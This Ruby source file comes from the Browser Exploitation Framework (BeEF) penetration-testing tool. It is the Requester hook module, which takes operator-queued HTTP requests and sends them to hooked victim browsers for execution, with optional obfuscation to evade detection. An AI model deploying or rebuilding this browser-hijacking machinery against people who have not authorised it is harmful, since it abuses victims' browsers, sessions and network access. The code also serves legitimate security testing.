#
# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

module BeEF
  module Extension
    module Requester
      module API

        require 'uri'
        class Hook

          include BeEF::Core::Handlers::Modules::BeEFJS

          # If the HTTP table contains requests that need to be sent (has_ran = waiting), retrieve
          # and send them to the hooked browser.
          def requester_run(hb, body)
            @body = body
            # Generate all the requests and output them to the hooked browser
            output = []
            BeEF::Core::Models::Http.all(:hooked_browser_id => hb.id, :has_ran => "waiting").each { |h|
              output << self.requester_parse_db_request(h)
            }

            return if output.empty?
            config = BeEF::Core::Configuration.instance
            ws = BeEF::Core::Websocket::Websocket.instance

            if config.get("beef.extension.evasion.enable")
              evasion = BeEF::Extension::Evasion::Evasion.instance
            end


            # todo antisnatchor: prevent sending "content" multiple times.
            #                    Better leaving it after the first run, and don't send it again.
            # todo antisnatchor: remove this gsub crap adding some hook packing.

            # If we use WebSockets, just reply wih the component contents
            if config.get("beef.http.websocket.enable") && ws.getsocket(hb.session)
              content = File.read(find_beefjs_component_path 'beef.net.requester').gsub('//
              //   Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
              //   Browser Exploitation Framework (BeEF) - http://beefproject.com
              //   See the file \'doc/COPYING\' for copying permission
              //', "")
              add_to_body output
              if config.get("beef.extension.evasion.enable")
                ws.send(evasion.obfuscate(content) + @body, hb.session)
              else
                ws.send(content + @body, hb.session)
              end
            # if we use XHR-polling, add the component to the main hook file
            else
              build_missing_beefjs_components 'beef.net.requester'
              # Send the command to perform the requests to the hooked browser
              add_to_body output
            end
          end

          def add_to_body(output)
            config = BeEF::Core::Configuration.instance

            req = %Q{
                beef.execute(function() {
                  beef.net.requester.send(
                    #{output.to_json}
                  );
                });
              }

            if config.get("beef.extension.evasion.enable")
              evasion = BeEF::Extension::Evasion::Evasion.instance
              @body << evasion.obfuscate(req)
            else
              @body << req
            end
          end

          #
          # Converts an HTTP db object into an Hash that follows the representation
          # of input data for the beef.net.request Javascript API function.
          # The Hash will then be converted into JSON, given as input to beef.net.requester.send Javascript API function
          # and finally sent to and executed by the hooked browser.
          def requester_parse_db_request(http_db_object)

            allow_cross_domain = http_db_object.allow_cross_domain.to_s
            verb = http_db_object.method.upcase
            proto = http_db_object.proto.downcase
            uri = http_db_object.request.split(/\s+/)[1]
            headers = {}

            req_parts = http_db_object.request.split(/\r?\n/)

            @host = http_db_object.domain
            @port = http_db_object.port

            #@note: retrieve HTTP headers values needed later, and the \r\n that indicates the start of the post-data (if any)
            req_parts.each_with_index do |value, index|
              if value.match(/^Content-Length:\s+(\d+)/)
                 @content_length = Integer(req_parts[index].split(/:\s+/)[1])
              end

              if value.eql?("") or value.strip.empty? # this will be the CRLF (before HTTP request body)
                @post_data_index = index
              end
            end

            #@note: add HTTP request headers to an Hash
            req_parts.each_with_index do |value, index|
              if verb.eql?('POST')
                if index > 0 and index < @post_data_index #only add HTTP headers, not the verb/uri/version or post-data
                   header_key = value.split(/: /)[0]
                   header_value = value.split(/: /)[1]
                   headers[header_key] = header_value
                end
              else
                if index > 0  #only add HTTP headers, not the verb/uri/version
                   header_key = value.split(/: /)[0]
                   header_value = value.split(/: /)[1]
                   headers[header_key] = header_value
                end
              end
            end

            # set default port if nil
            if @port.nil?
              if uri.to_s =~ /^https?/
                # absolute
                (uri.match(/^https:/)) ? @port = 443 : @port = 80
              else
                # relative
                (proto.eql?('https')) ? @port = 443 : @port = 80
              end
            end

            # Build request
            http_request_object = {
              'id'               => http_db_object.id,
              'method'           => verb,
              'proto'            => proto,
              'host'             => @host,
              'port'             => @port,
              'uri'              => uri,
              'headers'          => headers,
              'allowCrossDomain' => allow_cross_domain
            }

            # Add POST request data
            if not @content_length.nil? and @content_length > 0
              post_data_sliced = req_parts.slice(@post_data_index + 1, req_parts.length)
              @post_data = post_data_sliced.join
              http_request_object['data'] = @post_data
            end

            #@note: parse HTTP headers Hash, adding them to the object that will be used by beef.net.requester.send
            headers.keys.each { |key| http_request_object['headers'][key] = headers[key] }

            http_request_object
          end
        end
      end
    end
  end
end
